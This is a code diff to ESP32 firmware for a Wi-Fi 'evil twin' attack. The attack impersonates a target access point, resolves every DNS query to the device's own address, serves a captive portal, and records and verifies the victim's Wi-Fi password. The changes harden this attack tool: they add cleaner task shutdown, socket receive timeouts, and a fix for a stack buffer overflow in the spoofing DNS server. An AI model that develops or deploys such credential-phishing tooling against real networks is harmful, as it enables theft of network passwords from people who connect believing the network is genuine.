@@ -20,6 +20,7 @@
 #include "lwip/sockets.h"
 #include "lwip/err.h"
 #include "lwip/sys.h"
+#include <sys/time.h>
 #include "freertos/FreeRTOS.h"
 #include "freertos/task.h"
 #include <sys/param.h>
@@ -49,10 +50,10 @@ static TaskHandle_t evil_twin_task_handle = NULL;
 static TaskHandle_t dns_task_handle = NULL;
 static httpd_handle_t evil_server = NULL;
 static int dns_socket = -1;
-static bool evil_twin_active = false;
+static volatile bool evil_twin_active = false;
 static char evil_twin_password[65] = {0};
-static bool password_captured = false;
-static bool password_verified = false;
+static volatile bool password_captured = false;
+static volatile bool password_verified = false;
 static wifi_ap_record_t evil_twin_target;
 
 
@@ -226,7 +227,28 @@ bool is_evil_twin_active(void) {
 }
 
 void attack_method_evil_twin_stop(void) {
+    if (!evil_twin_active) {
+        return;
+    }
+
+    evil_twin_active = false;
+
+    if (evil_twin_task_handle != NULL) {
+        /* The worker checks evil_twin_active between attempts; give it a couple
+         * of seconds to walk out of its own loop before it is removed. */
+        for (int i = 0; i < 40 && evil_twin_task_handle != NULL; i++) {
+            vTaskDelay(pdMS_TO_TICKS(50));
+        }
+        if (evil_twin_task_handle != NULL) {
+            vTaskDelete(evil_twin_task_handle);
+            evil_twin_task_handle = NULL;
+        }
+    }
+
+    stop_captive_portal();
     restore_management_system();
+
+    ESP_LOGI(TAG, "Evil twin stopped");
 }
 
 const char* get_evil_twin_password(void) {
@@ -253,17 +275,36 @@ static void dns_server_task(void *pvParameters) {
     socklen_t addr_len = sizeof(client_addr);
 
     dns_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
+    if (dns_socket < 0) {
+        ESP_LOGE(TAG, "DNS socket create failed");
+        dns_task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+
+    /* So the loop can notice evil_twin_active going false instead of blocking
+     * in recvfrom until the task gets force-deleted mid-syscall. */
+    struct timeval rcv_timeout = { .tv_sec = 0, .tv_usec = 500000 };
+    setsockopt(dns_socket, SOL_SOCKET, SO_RCVTIMEO, &rcv_timeout, sizeof(rcv_timeout));
+
     memset(&server_addr, 0, sizeof(server_addr));
     server_addr.sin_family = AF_INET;
     server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
     server_addr.sin_port = htons(53);
 
-    bind(dns_socket, (struct sockaddr *)&server_addr, sizeof(server_addr));
+    if (bind(dns_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) != 0) {
+        ESP_LOGE(TAG, "DNS bind failed");
+    }
     ESP_LOGI(TAG, "DNS Server Active");
 
     while (evil_twin_active) {
-        int len = recvfrom(dns_socket, buffer, sizeof(buffer), 0, (struct sockaddr *)&client_addr, &addr_len);
+        /* Reserve room for the answer record. The reply used to be appended at
+         * buffer + len with no check, so a 512-byte query wrote 16 bytes past
+         * the end of the stack buffer. */
+        int len = recvfrom(dns_socket, buffer, sizeof(buffer) - 16, 0,
+                           (struct sockaddr *)&client_addr, &addr_len);
         if (len < 12) continue;
+        if (len > (int)sizeof(buffer) - 16) continue;
 
         dns_header_t *dns_header = (dns_header_t *)buffer;
         dns_header->flags = htons(0x8180);
@@ -277,8 +318,11 @@ static void dns_server_task(void *pvParameters) {
         *ptr++ = 0x00; *ptr++ = 0x04;
         *ptr++ = 192; *ptr++ = 168; *ptr++ = 4; *ptr++ = 1;
 
-        sendto(dns_socket, buffer, ptr - buffer, 0, (struct sockaddr *)&client_addr, addr_len);
+        sendto(dns_socket, buffer, (int)(ptr - buffer), 0,
+               (struct sockaddr *)&client_addr, addr_len);
     }
+
+    dns_task_handle = NULL;
     vTaskDelete(NULL);
 }
 
@@ -427,15 +471,27 @@ static void start_captive_portal(void) {
 }
 
 static void stop_captive_portal(void) {
+    /* Signal the loop to exit, then let it leave recvfrom on its own 500 ms
+     * timeout. Force-deleting a task that sits blocked in a lwIP syscall
+     * corrupts socket bookkeeping and leaks the PCB. */
+    evil_twin_active = false;
+
     if (dns_task_handle) {
-        vTaskDelete(dns_task_handle);
-        dns_task_handle = NULL;
+        for (int i = 0; i < 20 && dns_task_handle != NULL; i++) {
+            vTaskDelay(pdMS_TO_TICKS(50));
+        }
+        if (dns_task_handle != NULL) {
+            vTaskDelete(dns_task_handle);
+            dns_task_handle = NULL;
+        }
     }
+
     if (evil_server) {
         httpd_stop(evil_server);
         evil_server = NULL;
         vTaskDelay(pdMS_TO_TICKS(300));
     }
+
     if (dns_socket != -1) {
         close(dns_socket);
         dns_socket = -1;
